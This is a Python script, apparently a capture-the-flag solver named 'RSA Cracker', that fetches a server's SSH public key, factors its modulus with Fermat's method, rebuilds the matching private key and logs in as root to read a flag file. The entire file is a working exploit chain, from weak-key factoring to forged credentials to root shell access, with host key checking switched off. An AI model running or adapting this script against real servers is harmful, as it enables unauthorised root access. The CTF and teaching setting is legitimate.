#!/usr/bin/python3

from colorama import Fore, Style
import gmpy2, os, subprocess
import pyfiglet
from gmpy2 import isqrt, invert
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# title
os.system("clear")
banner = pyfiglet.figlet_format("RSA Cracker")
print(banner)

def modinv(e, m):
    return int(invert(e, m))

def factorize(n):
    if n & 1 == 0:
        return int(n // 2), 2

    a = isqrt(n)
    if a * a == n:
        return int(a), int(a)

    while True:
        a += 1
        bsq = a**2 - n
        b = isqrt(bsq)
        if b * b == bsq:
            break

    p, q = int(a + b), int(a - b)
    print(f"p is: {Fore.GREEN}{p}{Style.RESET_ALL}")
    print(f'q is: {Fore.GREEN}{q}{Style.RESET_ALL}')
    return p, q

def calculate_d(p, q, e=65537):
    phi_n = (p - 1) * (q - 1)
    d = modinv(e, phi_n)
    return d

def generate_ssh_private_key(p, q, d, e=65537):
    n = p * q
    dmp1 = d % (p - 1)
    dmq1 = d % (q - 1)
    iqmp = int(gmpy2.invert(q, p))
    
    private_key = rsa.RSAPrivateNumbers(
        p=p,
        q=q,
        d=d,
        dmp1=dmp1,
        dmq1=dmq1,
        iqmp=iqmp,
        public_numbers=rsa.RSAPublicNumbers(e=e, n=n)
    ).private_key(default_backend())

    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    return pem.decode('utf-8')

IP = input("Enter room IP: ")
#IP="10.10.43.183"
cmd = f"curl -s http://{IP}/development/id_rsa.pub"
#result = subprocess.run(cmd, shell=True, text=True, capture_output=True)
stdout = subprocess.check_output(cmd, shell=True, text=True)
print(f"\nGRABBING SSH PUBLIC KEY FROM SERVER:\n {Fore.GREEN}{stdout}{Style.RESET_ALL}")

#SAVE PUBLIC KEY
with open("id_rsa.pub", "w") as f:
    f.write(stdout)
print(f"\nSAVED PUBLIC KEY as {Fore.GREEN}id_rsa.pub{Style.RESET_ALL}\n")

#GET PUB KEY LENGTH (FINGERPRINT)
cmd = f"ssh-keygen -lf id_rsa.pub"
stdout = subprocess.check_output(cmd, shell=True, text=True)
print(f"PUBLIC KEY LENGTH: {Fore.GREEN}{stdout}{Style.RESET_ALL}")

#DERIVE MODULUS FROM PUB KEY
cmd = "ssh-keygen -f id_rsa.pub -e -m PKCS8 | openssl rsa -pubin -noout -modulus"
modulus = subprocess.check_output(cmd, shell=True, text=True)
print("MODULUS DERIVED FROM PUB KEY IN HEX:")
modulus = modulus.split('=')[1]
print(f"{Fore.GREEN}{modulus}{Style.RESET_ALL}")

#CONVERT MODULUS (n) TO DECIMAL
cmd = f'echo "ibase=16; {modulus}" | BC_LINE_LENGTH=0 bc'
stdout = subprocess.check_output(cmd, shell=True, text=True).replace("\\","").replace("\n","") 
n = int(stdout)
print(f"CONVERTED MODULUS TO DECIMAL:\n{Fore.GREEN}{n}{Style.RESET_ALL}\n")
last_10_digits = str(n)[-10:]
print(f"THE LAST 10 DIGITS OF MODULUS ARE: {Fore.GREEN}{last_10_digits}{Style.RESET_ALL}\n")

p, q = factorize(n)

#What is the numerilscal difference between p and q
print(f"\nDIFFERENCE BETWEEN p AND q: {Fore.GREEN}{p-q}{Style.RESET_ALL}")

d = calculate_d(p, q)
ssh_private_key = generate_ssh_private_key(p, q, d)
print(f"\nSSH PRIVATE KEY:\n {Fore.GREEN}{ssh_private_key}{Style.RESET_ALL}")

#SAVE PRIVATE KEY
with open("ssh_private_key.pem", "w") as f:
    f.write(ssh_private_key)
print(f"\nSAVED PRIVATE KEY as {Fore.GREEN}ssh_private_key.pem{Style.RESET_ALL}\n")

#SSH AS ROOT
cmd = f"chmod 600 ssh_private_key.pem"
stdout = subprocess.check_output(cmd, shell=True, text=True)
#print(stdout)

#SSH LOGON AS ROOT
print("LOGGING IN AS ROOT VIA SSH WITH THE NEWLY MINTED PRIVATE KEY...")
remote_command = "cat flag"
cmd= f"ssh -i ssh_private_key.pem -o StrictHostKeyChecking=no root@{IP} {remote_command}"
stdout = subprocess.check_output(cmd, shell=True, text=True)
print(f"\nYour flag is: {Fore.GREEN}{stdout}{Style.RESET_ALL}")

